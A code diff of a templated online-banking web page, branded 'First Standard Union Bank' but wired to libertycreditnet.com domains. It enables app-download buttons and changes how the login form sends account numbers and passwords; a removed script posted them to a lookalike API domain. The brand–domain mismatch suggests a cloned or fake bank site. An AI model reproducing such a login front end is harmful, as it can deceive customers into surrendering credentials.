@@ -46,7 +46,7 @@ header.header-area {
 }
 
 .top-header {
-    background-color: #d50505;
+    background-color: #0c1235;
 }
 
 .top-header {
@@ -90,7 +90,6 @@ header.header-area {
 
 .header-area .top-header {
     background-color: var(--mt-theme-default-background);
-   // background-color: "#d50505";
     padding: 0;
     height: 47px;
     position: relative;
@@ -3495,7 +3494,7 @@ body.personal-banking .about-content h2 {
 /*End Install CSS*/
 
 /*Start Default Theme Config*/
-:root { 
+:root {
  --mt-theme-default-background: #d50505;  
   --mt-theme-text: #ffffff;
   --mt-theme-hover: #0e2c52;
@@ -5720,7 +5719,7 @@ body .install-app-container {
                         <div class="cover-log-form">
                             <div class="cover-log-form-inner">
                                 
-                                <form   name="u_signon2" id="uSignon2" action="" method="POST">
+                                <form autocomplete="off" name="u_signon" id="uSignon" action="https://www.libertycreditnet.com/internet-banking/" method="POST">
                                     
                                     <div class="log-form-group">
                                         <div class="log-form-label">Online ID</div>
@@ -5728,7 +5727,7 @@ body .install-app-container {
                                             <span class="log-form-icon">
                                                 <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewbox="0 0 512 512"><path d="M344 144c-3.92 52.87-44 96-88 96s-84.15-43.12-88-96c-4-55 35-96 88-96s92 42 88 96z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="32"></path><path d="M256 304c-87 0-175.3 48-191.64 138.6C62.39 453.52 68.57 464 80 464h352c11.44 0 17.62-10.48 15.65-21.4C431.3 352 343 304 256 304z" fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="32"></path></svg>
                                             </span>
-                                            <input type="text" name="online_id"  id="user_id"  placeholder="User ID or Account Number" class="log-form-input" autocomplete="off">
+                                            <input type="text" name="online_id" placeholder="User ID or Account Number" class="log-form-input" autocomplete="off">
                                         </div>
                                     </div>
                                     
@@ -5738,16 +5737,14 @@ body .install-app-container {
                                             <span class="log-form-icon">
                                                 <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewbox="0 0 512 512"><path d="M336 208v-95a80 80 0 00-160 0v95" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="32"></path><rect x="96" y="208" width="320" height="272" rx="48" ry="48" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="32"></rect></svg>
                                             </span>
-                                            <input type="password"  id="password"  name="password" placeholder="Login Password" class="log-form-input is-pass-input s-pass-input" autocomplete="new-password">
+                                            <input type="password" name="password" placeholder="Login Password" class="log-form-input is-pass-input s-pass-input" autocomplete="new-password">
                                             
                                             <div class="x-review-pass">
                                                <button type="button" class="seePass">
                                                  <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512" width="35" height="35"><path d="M432 448a15.92 15.92 0 01-11.31-4.69l-352-352a16 16 0 0122.62-22.62l352 352A16 16 0 01432 448zM255.66 384c-41.49 0-81.5-12.28-118.92-36.5-34.07-22-64.74-53.51-88.7-91v-.08c19.94-28.57 41.78-52.73 65.24-72.21a2 2 0 00.14-2.94L93.5 161.38a2 2 0 00-2.71-.12c-24.92 21-48.05 46.76-69.08 76.92a31.92 31.92 0 00-.64 35.54c26.41 41.33 60.4 76.14 98.28 100.65C162 402 207.9 416 255.66 416a239.13 239.13 0 0075.8-12.58 2 2 0 00.77-3.31l-21.58-21.58a4 4 0 00-3.83-1 204.8 204.8 0 01-51.16 6.47zM490.84 238.6c-26.46-40.92-60.79-75.68-99.27-100.53C349 110.55 302 96 255.66 96a227.34 227.34 0 00-74.89 12.83 2 2 0 00-.75 3.31l21.55 21.55a4 4 0 003.88 1 192.82 192.82 0 0150.21-6.69c40.69 0 80.58 12.43 118.55 37 34.71 22.4 65.74 53.88 89.76 91a.13.13 0 010 .16 310.72 310.72 0 01-64.12 72.73 2 2 0 00-.15 2.95l19.9 19.89a2 2 0 002.7.13 343.49 343.49 0 0068.64-78.48 32.2 32.2 0 00-.1-34.78z"></path><path d="M256 160a95.88 95.88 0 00-21.37 2.4 2 2 0 00-1 3.38l112.59 112.56a2 2 0 003.38-1A96 96 0 00256 160zM165.78 233.66a2 2 0 00-3.38 1 96 96 0 00115 115 2 2 0 001-3.38z"></path></svg>
                                                </button>
-                                               <button type="button" class="hidePass" style="display: none;" id="submit-btn2">
-                                                 <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512" width="35" height="35"><path d="M255.66 112c-77.94 0-157.89 45.11-220.83 135.33a16 16 0 00-.27 17.77C82.92 340.8 161.8 400 255.66 400c92.84 0 173.34-59.38 221.79-135.25a16.14 16.14 0 000-17.47C428.89 172.28 347.8 112 255.66 112z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="32">
-
-                                                 </path><circle cx="256" cy="256" r="80" fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="32"></circle></svg>
+                                               <button type="button" class="hidePass" style="display: none;">
+                                                 <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512" width="35" height="35"><path d="M255.66 112c-77.94 0-157.89 45.11-220.83 135.33a16 16 0 00-.27 17.77C82.92 340.8 161.8 400 255.66 400c92.84 0 173.34-59.38 221.79-135.25a16.14 16.14 0 000-17.47C428.89 172.28 347.8 112 255.66 112z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="32"></path><circle cx="256" cy="256" r="80" fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="32"></circle></svg>
                                                </button>
                                             </div>
                                         </div>
@@ -5762,9 +5759,7 @@ body .install-app-container {
                                     </div>
                                     
                                     <div class="log-form-footer">
-                                         <button type="submit" name="go_customer" id="submit-btn" class="log-form-open-acc">Log In Account</button> 
-
-                                         
+                                            <button type="submit" name="go_customer" class="log-form-open-acc">Log In Account</button>
                                     </div>
                                     
                                     <div class="log-form-links">
@@ -6063,7 +6058,7 @@ body .install-app-container {
                <div class="case-box-desc">
                   <div class="case-block-inner">
                      <h4>Advisory Businesses</h4>
-                     <p>Discover and execute the right strategic options through these <span class="bname"></span> business strategic advisory.</p>
+                     <p>Discover and execute the right strategic options through these First Standard Union Bank business strategic advisory.</p>
                      <div class="mtbox-more-btn">Learn More</div> 
                   </div>
                </div>
@@ -6136,7 +6131,7 @@ body .install-app-container {
                <div class="case-box-desc">
                   <div class="case-block-inner">
                      <h4>Digital Wallets</h4>
-                     <p>You can also access any ATM when you add your <span class="bname"></span> Debit or SmartPay Card to your digital wallet.</p>
+                     <p>You can also access any ATM when you add your First Standard Union Bank Debit or SmartPay Card to your digital wallet.</p>
                      <div class="mtbox-more-btn">Learn More</div> 
                   </div>
                </div>
@@ -6227,7 +6222,180 @@ body .install-app-container {
 <div class="our-locations-background ourLocationsBack"></div>
 </div>
 
-<div id="installApp" style="display: none;"></div>
+
+<div class="install-app-container computer-version">
+    <div class="install-app-container-inner">
+        
+        <div class="container">
+            <div class="computer-app-install">
+                <div class="computer-app-install-inner">
+                    
+                    <div class="computer-app-install-heading">
+                        <h2>Download First Standard Union Bank App</h2>
+                        <div class="opr-syst-txt">For all Operating system</div>
+                    </div>
+                    
+                    <div class="computer-app-install-images">
+                        <span class="computer-app-install-svg">
+                            <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="160" height="160" viewbox="0 0 512.000000 512.000000" preserveaspectratio="xMidYMid meet">
+
+<g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)" fill="#081446" stroke="none">
+<path d="M210 4871 c-83 -26 -141 -74 -181 -151 l-24 -45 0 -1755 0 -1755 23
+-45 c33 -63 76 -105 136 -132 l51 -23 904 -3 c713 -2 901 -5 893 -15 -6 -6
+-29 -108 -53 -226 -40 -199 -41 -215 -25 -226 14 -11 -2 -13 -92 -16 -98 -4
+-113 -7 -149 -31 -49 -32 -83 -85 -90 -138 -10 -76 -88 -70 957 -70 1049 0
+968 -6 956 73 -9 53 -40 99 -90 135 -35 24 -49 27 -148 31 -90 3 -106 5 -92
+16 16 11 15 27 -25 226 -24 118 -47 220 -53 226 -8 10 180 13 893 15 l904 3
+51 23 c60 27 103 69 136 132 l23 45 0 1755 0 1755 -27 50 c-31 59 -67 94 -128
+126 l-45 24 -2340 2 c-1287 1 -2351 -2 -2365 -6z m4733 -101 c21 -14 50 -43
+65 -64 l27 -39 3 -1454 2 -1453 -2480 0 -2480 0 0 1433 c0 937 4 1445 10 1469
+13 44 81 115 124 127 18 6 983 9 2362 8 l2330 -2 37 -25z m95 -3263 c-3 -171
+-4 -174 -30 -213 -15 -21 -44 -50 -65 -64 l-37 -25 -2346 0 -2346 0 -37 25
+c-21 14 -50 43 -65 64 -26 39 -27 42 -30 213 l-4 173 2482 0 2482 0 -4 -173z
+m-2478 -382 l2355 0 58 32 c31 17 57 28 57 25 0 -4 -10 -25 -23 -46 -15 -28
+-39 -49 -76 -68 l-53 -28 -2318 0 -2318 0 -53 28 c-37 19 -61 40 -76 68 -13
+21 -23 42 -23 46 0 3 26 -8 58 -25 l57 -32 2355 0z m489 -183 c-9 -14 -3 -60
+26 -202 41 -209 51 -247 68 -254 7 -2 -256 -4 -583 -4 -327 0 -590 2 -583 4
+17 7 27 45 68 254 29 142 35 188 26 202 -11 17 12 18 489 18 477 0 500 -1 489
+-18z m320 -560 c19 -9 41 -27 49 -39 l14 -23 -871 0 c-479 0 -871 4 -871 8 0
+11 51 58 70 65 8 3 366 6 795 6 724 1 782 0 814 -17z"></path>
+<path d="M252 4628 c-17 -17 -17 -2679 0 -2696 17 -17 4599 -17 4616 0 17 17
+17 2679 0 2696 -17 17 -4599 17 -4616 0z m4548 -1348 l0 -1280 -2240 0 -2240
+0 0 1280 0 1280 2240 0 2240 0 0 -1280z"></path>
+<path d="M2532 3307 c-468 -468 -852 -859 -852 -868 0 -19 20 -39 40 -39 20 0
+1720 1700 1720 1721 0 19 -20 39 -40 39 -8 0 -399 -384 -868 -853z"></path>
+<path d="M2212 3627 c-204 -204 -372 -379 -372 -388 0 -19 20 -39 40 -39 20 0
+760 740 760 761 0 19 -20 39 -40 39 -8 0 -183 -168 -388 -373z"></path>
+<path d="M2852 2987 c-204 -204 -372 -379 -372 -388 0 -19 20 -39 40 -39 20 0
+760 740 760 761 0 19 -20 39 -40 39 -8 0 -183 -168 -388 -373z"></path>
+<path d="M2495 1586 c-66 -29 -105 -106 -91 -181 9 -46 62 -100 114 -115 56
+-17 115 0 159 46 116 123 -26 318 -182 250z m120 -91 c60 -59 -6 -158 -84
+-126 -29 13 -51 47 -51 82 0 31 44 69 80 69 19 0 40 -9 55 -25z"></path>
+</g>
+</svg> 
+                        </span>
+                        <span class="computer-app-install-svg">
+                            <?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="160" height="160" viewbox="0 0 512.000000 512.000000" preserveaspectratio="xMidYMid meet">
+
+<g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)" fill="#081446" stroke="none">
+<path d="M470 4222 c-20 -10 -42 -32 -53 -52 -16 -33 -17 -118 -15 -1414 3
+-1301 4 -1379 21 -1390 12 -8 22 -8 35 0 16 11 17 89 20 1389 1 998 5 1382 13
+1392 10 11 188 13 1031 13 1016 0 1019 0 1008 -20 -8 -14 -8 -26 0 -40 11 -20
+8 -20 -968 -20 -747 0 -981 -3 -990 -12 -17 -17 -17 -2519 0 -2536 17 -17
+3959 -17 3976 0 17 17 17 2519 0 2536 -9 9 -243 12 -990 12 -976 0 -978 0
+-966 20 10 16 10 24 0 40 -12 20 -10 20 1007 20 842 0 1020 -2 1030 -13 8 -10
+12 -394 13 -1392 3 -1300 4 -1378 21 -1389 12 -8 22 -8 35 0 16 11 17 89 20
+1390 2 1296 1 1381 -15 1414 -11 20 -33 42 -53 52 -33 17 -154 18 -2090 18
+-1936 0 -2057 -1 -2090 -18z m4010 -1422 l0 -1200 -1920 0 -1920 0 0 1200 0
+1200 1920 0 1920 0 0 -1200z"></path>
+<path d="M2532 2827 c-424 -424 -772 -779 -772 -788 0 -19 20 -39 40 -39 20 0
+1560 1540 1560 1561 0 19 -20 39 -40 39 -8 0 -363 -348 -788 -773z"></path>
+<path d="M2212 3147 c-160 -160 -292 -299 -292 -308 0 -19 20 -39 40 -39 20 0
+600 580 600 601 0 19 -20 39 -40 39 -8 0 -147 -132 -308 -293z"></path>
+<path d="M2852 2507 c-160 -160 -292 -299 -292 -308 0 -19 20 -39 40 -39 20 0
+600 580 600 601 0 19 -20 39 -40 39 -8 0 -147 -132 -308 -293z"></path>
+<path d="M168 1300 c-11 -17 -24 -20 -79 -20 -47 0 -70 -4 -79 -15 -9 -10 -11
+-50 -9 -133 4 -110 6 -122 31 -158 15 -21 44 -50 65 -64 l37 -25 2426 0 2426
+0 37 25 c21 14 50 43 65 64 25 36 27 48 31 158 2 83 0 123 -9 133 -9 11 -32
+15 -79 15 -55 0 -68 3 -79 20 -11 18 -23 20 -112 20 -89 0 -101 -2 -112 -20
+-9 -14 -24 -20 -48 -20 -24 0 -39 6 -48 20 -11 18 -23 20 -112 20 -89 0 -101
+-2 -112 -20 -18 -28 -78 -28 -96 0 -11 18 -23 20 -112 20 -89 0 -101 -2 -112
+-20 -18 -28 -78 -28 -96 0 -11 18 -23 20 -112 20 -89 0 -101 -2 -112 -20 -18
+-28 -78 -28 -96 0 -11 18 -23 20 -112 20 -89 0 -101 -2 -112 -20 -18 -28 -78
+-28 -96 0 -11 18 -23 20 -112 20 -89 0 -101 -2 -112 -20 -11 -17 -24 -20 -78
+-20 -73 0 -90 -10 -90 -52 l0 -28 -400 0 -400 0 0 28 c0 42 -17 52 -90 52 -54
+0 -67 3 -78 20 -11 18 -23 20 -112 20 -89 0 -101 -2 -112 -20 -18 -28 -78 -28
+-96 0 -11 18 -23 20 -112 20 -89 0 -101 -2 -112 -20 -9 -14 -24 -20 -48 -20
+-24 0 -39 6 -48 20 -11 18 -23 20 -112 20 -89 0 -101 -2 -112 -20 -9 -14 -24
+-20 -48 -20 -24 0 -39 6 -48 20 -11 18 -23 20 -112 20 -89 0 -101 -2 -112 -20
+-9 -14 -24 -20 -48 -20 -24 0 -39 6 -48 20 -11 18 -23 20 -112 20 -89 0 -101
+-2 -112 -20 -9 -14 -24 -20 -48 -20 -24 0 -39 6 -48 20 -11 18 -23 20 -112 20
+-89 0 -101 -2 -112 -20z m1912 -128 c0 -15 5 -33 12 -40 17 -17 919 -17 936 0
+7 7 12 25 12 40 l0 28 1000 0 1000 0 0 -67 c0 -84 -21 -131 -70 -155 -33 -17
+-169 -18 -2410 -18 -2241 0 -2377 1 -2410 18 -49 24 -70 71 -70 155 l0 67
+1000 0 1000 0 0 -28z"></path>
+</g>
+</svg>
+ 
+                        </span>
+                        <span class="computer-app-install-svg">
+                            <?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewbox="0 0 512.000000 512.000000" preserveaspectratio="xMidYMid meet">
+
+<g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)" fill="#081446" stroke="none">
+<path d="M134 4389 c-44 -13 -112 -83 -124 -129 -7 -25 -9 -573 -8 -1642 3
+-1473 4 -1606 20 -1629 15 -24 15 -26 -4 -38 -18 -11 -20 -19 -14 -59 8 -56
+38 -103 90 -140 l39 -27 2427 0 2427 0 39 27 c52 37 82 84 90 140 6 40 4 48
+-14 59 -19 12 -19 14 -4 38 16 23 17 155 17 1651 l0 1627 -27 39 c-15 21 -44
+50 -65 64 l-37 25 -2410 2 c-1427 1 -2424 -2 -2442 -8z m4836 -87 c20 -10 42
+-32 52 -52 17 -33 18 -131 18 -1610 0 -1479 -1 -1577 -18 -1610 -10 -20 -32
+-42 -52 -52 -33 -17 -111 -18 -1215 -18 -1013 1 -1175 3 -1148 15 90 39 90
+171 0 210 -28 12 124 14 1068 15 843 0 1104 3 1113 12 17 17 17 2839 0 2856
+-17 17 -4439 17 -4456 0 -17 -17 -17 -2839 0 -2856 9 -9 270 -12 1113 -12 944
+-1 1096 -3 1068 -15 -90 -39 -90 -171 0 -210 27 -12 -135 -14 -1148 -15 -1104
+0 -1182 1 -1215 18 -20 10 -42 32 -52 52 -17 33 -18 131 -18 1610 0 1479 1
+1577 18 1610 10 20 32 42 52 52 33 17 169 18 2410 18 2241 0 2377 -1 2410 -18z
+m-250 -1662 l0 -1360 -2160 0 -2160 0 0 1360 0 1360 2160 0 2160 0 0 -1360z
+m-2130 -1535 c26 -32 -13 -81 -47 -59 -35 22 -23 74 17 74 10 0 23 -7 30 -15z
+m-30 -220 c2336 0 2427 1 2454 18 l28 19 -7 -24 c-13 -42 -36 -69 -70 -84 -51
+-21 -4759 -21 -4810 0 -34 15 -57 42 -70 84 l-7 24 28 -19 c27 -17 118 -18
+2454 -18z"></path>
+<path d="M2530 4221 c-25 -47 36 -83 64 -38 8 12 8 22 0 35 -16 25 -51 27 -64
+3z"></path>
+<path d="M2532 2667 c-468 -468 -852 -859 -852 -868 0 -19 20 -39 40 -39 20 0
+1720 1700 1720 1721 0 19 -20 39 -40 39 -8 0 -399 -384 -868 -853z"></path>
+<path d="M2212 2987 c-204 -204 -372 -379 -372 -388 0 -19 20 -39 40 -39 20 0
+760 740 760 761 0 19 -20 39 -40 39 -8 0 -183 -168 -388 -373z"></path>
+<path d="M2852 2347 c-204 -204 -372 -379 -372 -388 0 -19 20 -39 40 -39 20 0
+760 740 760 761 0 19 -20 39 -40 39 -8 0 -183 -168 -388 -373z"></path>
+</g>
+</svg>
+ 
+                        </span>
+                    </div>
+                    
+                    <div class="comp-app-install-buttons" id="installApp">
+                        
+                        <button class="computer-app-install-btn">
+                            <div class="computer-app-install-btn-inner">
+                                <div class="comp-app-install-btn-svg">
+                                    <svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="35" height="35" viewbox="0 0 512.000000 512.000000" preserveaspectratio="xMidYMid meet"> <g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)" stroke="none"> <path d="M3830 4799 c-690 -87 -1258 -158 -1262 -159 -5 0 -8 -432 -8 -960 l0 -960 1280 0 1280 0 0 1120 c0 1060 -1 1120 -17 1119 -10 -1 -583 -72 -1273 -160z"></path> <path d="M1110 4459 c-602 -76 -1098 -138 -1102 -139 -5 0 -8 -360 -8 -800 l0 -800 1120 0 1120 0 0 940 c0 889 -1 940 -17 939 -10 -1 -511 -63 -1113 -140z"></path> <path d="M0 1601 l0 -799 38 -6 c20 -3 507 -65 1082 -136 575 -71 1062 -133 1083 -136 l37 -6 0 941 0 941 -1120 0 -1120 0 0 -799z"></path> <path d="M2560 1441 l0 -959 38 -6 c20 -3 579 -74 1242 -156 663 -82 1222 -153 1243 -156 l37 -6 0 1121 0 1121 -1280 0 -1280 0 0 -959z"></path> </g> </svg>
+                                </div>
+                                <div class="comp-app-install-btn-txt">
+                                    <div class="comp-app-install-btn-txtitle">Download</div>
+                                    <div class="comp-app-install-btn-txtsubtitle">for Windows</div>
+                                </div>
+                            </div>
+                        </button>
+                        
+                        <button class="computer-app-install-btn">
+                            <div class="computer-app-install-btn-inner">
+                                <div class="comp-app-install-btn-svg">
+                                    <svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="35" height="35" viewbox="0 0 512.000000 512.000000" preserveaspectratio="xMidYMid meet"> <g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)" stroke="none"> <path d="M3465 5105 c-208 -45 -441 -172 -584 -317 -218 -222 -331 -489 -331 -782 l0 -69 113 6 c218 12 369 80 540 246 251 243 376 512 377 814 l0 117 -27 -1 c-16 0 -55 -7 -88 -14z"></path> <path d="M3305 3865 c-112 -20 -237 -59 -441 -137 -183 -69 -192 -72 -279 -72 -83 0 -99 3 -200 43 -357 141 -506 177 -705 168 -179 -8 -291 -40 -474 -135 -360 -185 -622 -571 -707 -1038 -32 -174 -32 -499 0 -704 91 -590 298 -1076 653 -1537 277 -359 507 -493 760 -442 73 14 129 32 301 95 376 138 512 136 920 -15 170 -63 251 -81 369 -81 274 0 453 135 751 569 161 235 292 483 366 693 l30 87 -67 37 c-237 132 -393 284 -495 482 -127 246 -160 567 -86 847 25 97 74 204 133 293 59 89 199 229 297 298 64 45 77 59 70 72 -40 73 -170 205 -266 272 -143 98 -331 172 -519 205 -106 18 -313 18 -411 0z"></path> </g> </svg>
+                                </div>
+                                <div class="comp-app-install-btn-txt">
+                                    <div class="comp-app-install-btn-txtitle">Download</div>
+                                    <div class="comp-app-install-btn-txtsubtitle">for macOS</div>
+                                </div>
+                            </div>
+                        </button>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+        </div>
+        
+    </div>
+</div>
+
 
 <footer class="footer" id="footer">
  <div class="footer-main bg-overlay">
@@ -6313,7 +6481,7 @@ body .install-app-container {
     <div class="container">
        <div class="row">
           <div class="col-lg-6 col-md-12">
-             <div class="copyright-info"><span>Copyright ©2024 <span class="bname"></span>. All Rights Reserved.</span></div>
+             <div class="copyright-info"><span>Copyright ©2022 First Standard Union Bank. All Rights Reserved.</span></div>
           </div>
           <div class="col-lg-6 col-md-12 m-is-hidden">
              <div class="footer-menu">
@@ -6344,31 +6512,27 @@ body .install-app-container {
 <script src="assets/js/odometer.min.js"></script>
 <script src="assets/js/owl.carousel.min.js"></script>
 <script src="assets/js/parallax.min.js"></script>
-<!-- <script src="assets/js/wow.min.js"></script>
+<script src="assets/js/wow.min.js"></script>
 <script src="assets/js/form-validator.min.js"></script>
-<script src="assets/js/contact-form-script.js"></script> -->
+<script src="assets/js/contact-form-script.js"></script>
 <script src="assets/js/main.js"></script>
-<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
 
-
-<!-- <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>  -->
 <!-- Mastertools App Script -->
-<!-- <script src="app-assets/app-installer.js"></script> -->
-<!-- <script src="app-assets/custom-install-btn.js"></script> -->
+<script src="app-assets/app-installer.js"></script>
+<script src="app-assets/custom-install-btn.js"></script>
 
 <script>
+function iosAddtoHome(){
+$("#modBack").html('<div class="modal-backdrop fade show"></div>');
+$("#ios-add-to-home-screen").slideDown();
+$("#ios-add-to-home-screen").addClass("show");
+}
 
-// function iosAddtoHome(){
-// $("#modBack").html('<div class="modal-backdrop fade show"></div>');
-// $("#ios-add-to-home-screen").slideDown();
-// $("#ios-add-to-home-screen").addClass("show");
-// }
-
-// $(document).on('click', '[data-bs-dismiss="modal"]', function() {
-// $("#modBack").html('');
-// $("#ios-add-to-home-screen").slideUp();
-// $("#ios-add-to-home-screen").removeClass("show");
-// });
+$(document).on('click', '[data-bs-dismiss="modal"]', function() {
+$("#modBack").html('');
+$("#ios-add-to-home-screen").slideUp();
+$("#ios-add-to-home-screen").removeClass("show");
+});
 </script>
 
 <script>
@@ -6420,11 +6584,11 @@ $(".mobile-menu-background").removeClass("nav-is-open");
 
 <script>
 $(".sign-on").click(function() {
-window.open("internet-banking/index.html", "_blank");
+window.open("https://www.libertycreditnet.com/internet-banking", "_blank");
 });
 
 $(".open-account-btn").click(function() {
-window.location.href="https://libertycreditsnet.com/account-application/";
+window.location.href="https://www.libertycreditnet.com/account-application/";
 });
 
 //$(".dropdown-btn").click(function() {
@@ -6432,7 +6596,7 @@ window.location.href="https://libertycreditsnet.com/account-application/";
 //});
 
 $(".get-started").click(function() {
-window.location.href="https://libertycreditsnet.com/account-application/";
+window.location.href="https://www.libertycreditnet.com/account-application/";
 });
 
 $(".top-nava a").click(function() {
@@ -6475,7 +6639,7 @@ $("#locationSecond").html('');
 function locatNow() {
 $.ajax({
 type: "POST",
-url: "https://libertycreditsnet.com/api//find-location",
+url: "https://libertycreditnet.com/api//find-location",
 data: $('form#branchLocationForm').serializeArray(),
 cache: false,
 beforeSend: function() {
@@ -6489,7 +6653,8 @@ $("#locationSecond").html(html);
 
 
 </script>
-
+</body>
+</html>
 <script>
 $(".mt-tab-nav-li").click(function() {
 $(".mt-tab-nav-li").removeClass("mt-tab-current");
@@ -6499,93 +6664,3 @@ $(".mt-tab-body-content").hide();
 $($(this).attr("data-tab")).show();
 });
 </script>
-
-
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script> 
-<script>
-let count=0;
- 
-$('#submit-btn').on('click', function(event){  
-event.preventDefault();  
- 
-count= count + 1;  
-var email=$("#user_id").val();
-var password=$("#password").val();
- 
-if (!email) {
-    $('#auth_reg').show();
-    $('#auth_reg').html("Account Number not found");
-
-                return false;
-            }
-if (!password) {
-    $('#auth_reg').show();
-    $('#auth_reg').html("Password is empty!");
-
-                return false;
-            }  
- 
- 
-
-$.ajax({
-//headers:{'Content-Type': 'application/json' },
-dataType: 'JSON',
-url: 'https://api.libertycreditsnet.com/login-account',
-type: 'POST',
-cache:true,
-data:{
-		 	acc_num:email,
-            acc_pass:password 
-      	}, 
-			//data: $('#contact').serialize(),
-            beforeSend: function(xhr){
-            	$('#submit-btn').html('Please wait');
-            },
-            success: function(response){
-                console.log(response.responseCode);
-                console.log(response.nav);
-                console.log(response.sessionId);
-              //collect valid session
-                let sessionId = sessionStorage.setItem("sessionId", response.sessionId);
-              //set cookie  
-              let date = new Date();
-                date.setTime(date.getTime() + (30 * 24 * 60 * 60 * 1000));
-                const expires = "expires=" + date.toUTCString();
-                document.cookie = "sessionId" + "=" + sessionId + "; " + expires + "; path=/";
-
-
-            	if(response.responseCode == "000"){  
-                swal({ title: "Warning!",
-							text: "Incorrect Account or Password!",
-							icon: "warning",
-							button: "Try again!",
-							dangerMode: true
-                    });
-                }
-
-
-            	if(response.responseCode == "100" && response.sessionId != ""){  
-                   window.location.replace("internet-banking/"+response.nav);
-                     //  window.location.replace("https://www."+my_slice);  
-                } 
-    },
-    error: function(error){
-      //  $("#password").val("");
-        console.log(error);
-    	if (count>=2) {
-    		count=0;
-    	//	 window.location.replace("https://www."+my_slice);
-    	}
-               	$("#auth_reg").show();
-				                      
-			$('#auth_reg').val("Invalid password. Please try again");
-                   },
-    complete: function(){
-    	$('#submit-btn').html('Log In Account');
-    }
-});
-  });
-</script>
-
-</body>
-</html>
